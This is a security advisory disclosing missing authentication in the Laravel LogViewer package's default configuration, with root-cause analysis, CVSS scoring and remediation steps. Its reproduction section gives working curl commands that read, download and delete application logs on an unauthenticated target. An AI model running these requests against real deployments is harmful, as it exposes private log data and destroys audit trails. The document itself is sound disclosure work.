# LogViewer Missing Authentication (Laravel)

**CWE-306 · Unauthenticated access to log dashboard, raw log download and log deletion · Default route middleware = null**

> **Vendor:** ARCANEDEV (https://github.com/ARCANEDEV)
> **Product:** LogViewer / arcanedev/log-viewer (Laravel package, https://github.com/ARCANEDEV/LogViewer)
> **Affected version:** 11.0.1 (commit 806498d, 2024-03-18; latest release as of 2026-09-30), verified on a fresh laravel/laravel v11.6.1 install
> **Affected endpoints:** `GET /log-viewer` (dashboard) · `GET /log-viewer/logs` (list) · `GET /log-viewer/logs/{date}` (entries) · `GET /log-viewer/logs/{date}/download` (raw file) · `DELETE /log-viewer/logs/delete` (deletion; only requires the `X-Requested-With` header)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Validation used only harmless marker log entries (`LGV-TEST-ENTRY` placeholders); no real credentials or sensitive values appear in this disclosure.

## 1. Summary

Unless the integrating application sets the `ARCANEDEV_LOGVIEWER_MIDDLEWARE` environment variable, the package registers **all** of its routes with `middleware => null` (`config/log-viewer.php:56-60`), keeping them out of Laravel's `web` group — so no session authentication and no CSRF protection apply. In that shipped default state any anonymous user can open the log dashboard, list all retained logs, download any raw `laravel-YYYY-MM-DD.log`, and **delete any log file** with a single request that merely carries the `X-Requested-With: XMLHttpRequest` header.

> **Dedup note (different root cause):** the package's repository already carries two reflected-XSS reports — issues [#467](https://github.com/ARCANEDEV/LogViewer/issues/467) ("Reflected DOM-Based XSS") and [#443](https://github.com/ARCANEDEV/LogViewer/issues/443) ("Version 4.7.1 Reflected XSS"). Both concern output encoding when rendering log content; this finding is a different vulnerability class (CWE-306, missing authentication), a different root cause (the route-middleware default in `config/log-viewer.php`), and different code paths (route registration, not view rendering).

## 2. Root Cause

| File | Line | Role |
|---|---|---|
| `config/log-viewer.php` | 56-60 | `'middleware' => env('ARCANEDEV_LOGVIEWER_MIDDLEWARE') ? explode(',', env(...)) : null` — env unset ⇒ middleware array `null` |
| `src/Http/Routes/LogViewerRoute.php` | 32-66 | all routes (dashboard, list, show, showByLevel, search, download, delete) registered inside `$this->group($attributes, ...)` with those null attributes — never in the `web` group |
| `src/Http/Controllers/LogViewerController.php` | 178-181 | `download($date)` → `$this->logViewer->download($date)` — streams the raw log file, no auth check |
| `src/Http/Controllers/LogViewerController.php` | 190-196 | `delete(Request $request)` → `abort_unless($request->ajax(), 405)` is the **only** gate; `$this->logViewer->delete($date)` then deletes `laravel-<date>.log` |

```php
// config/log-viewer.php:56-60
'middleware' => env('ARCANEDEV_LOGVIEWER_MIDDLEWARE')
    ? explode(',', env('ARCANEDEV_LOGVIEWER_MIDDLEWARE'))
    : null,                                   // default state: null => no auth middleware at all

// src/Http/Controllers/LogViewerController.php:190-196
public function delete(Request $request)
{
    abort_unless($request->ajax(), 405, 'Method Not Allowed');  // only gate: X-Requested-With header
    $date = $request->input('date');
    return response()->json(['result' => $this->logViewer->delete($date) ? 'success' : 'error']);
}
```

## 3. Prerequisites

- A default installation: `composer require arcanedev/log-viewer` with the stock config — `ARCANEDEV_LOGVIEWER_MIDDLEWARE` unset (the shipped default) and `log-viewer.route.enabled` = `true` (default).
- **No login, no token, no session, no CSRF token** — none exist to have, because the routes carry no middleware and sit outside the `web` group.
- Deletion additionally requires nothing but the `X-Requested-With: XMLHttpRequest` header (the package's own ajax check).

## 4. Reproduction

```bash
# T1 - dashboard, unauthenticated
curl -s -o /dev/null -w '%{http_code}\n' http://<target>/log-viewer/          # -> 200

# T3 - raw log file download, unauthenticated
curl -s -D - -o laravel.log http://<target>/log-viewer/logs/2026-09-30/download
#   -> HTTP 200, Content-Disposition: attachment; filename=laravel-2026-09-30.log

# T4b - DELETE: no CSRF, no auth, only the ajax header required -> log destroyed
curl -s -X DELETE -H 'X-Requested-With: XMLHttpRequest' \
     http://<target>/log-viewer/logs/delete -d 'date=2026-09-30'
#   -> {"result":"success"}
```

Scripted PoC: `poc/poc-unauth.sh` (target source: `poc/TARGET-SOURCE.txt`). Raw verification transcript: `evidence/LGV-01.txt`.

## 5. Confirmed Techniques

- Verified live on a fresh install (laravel/laravel v11.6.1 + arcanedev/log-viewer ^11.0 → 11.0.1, stock config, `php artisan serve`), every request carrying no session/cookie/token.
- T1 `GET /log-viewer` → HTTP 200 full dashboard HTML (16,562 bytes); T2 `GET /log-viewer/logs` → HTTP 200; T3 download → HTTP 200 with `Content-Disposition: attachment` and the full raw log; T4a control `DELETE` without header → 405 (the only gate); T4b `DELETE` with header → `{"result":"success"}`, file verified gone from disk (T5 dashboard reflects deletion, still unauthenticated).
- **Scope boundary (honest):** path traversal is **not** reachable — `{date}` is constrained to a single `YYYY-MM-DD` segment.

## 6. Impact

Any anonymous remote user of an affected deployment can read every retained application log — stack traces with absolute filesystem paths, query payloads, user emails, session and exception context, a rich reconnaissance source — and can silently erase the complete log archive across all dates with a single header-bearing request, destroying the audit trail and impeding incident response. No privileges and no user interaction are required.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L` (Base 8.6 — High)

## 8. Remediation

1. Deny by default: when the configured middleware array resolves to null/empty, refuse to register the routes (or abort with configuration guidance) instead of silently exposing them.
2. Ship a secure default — require an auth middleware (or document a mandatory env value) in the README/config comments.
3. Keep the routes inside Laravel's `web` group so session + `VerifyCsrfToken` protection apply.
4. Require a session-bound CSRF token on the destructive `delete` action (beyond the trivially spoofable ajax header).

## 9. References

- Project: https://github.com/ARCANEDEV/LogViewer
- CWE-306 (Missing Authentication for Critical Function): https://cwe.mitre.org/data/definitions/306.html
- External disclosure: [GIST_URL]
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
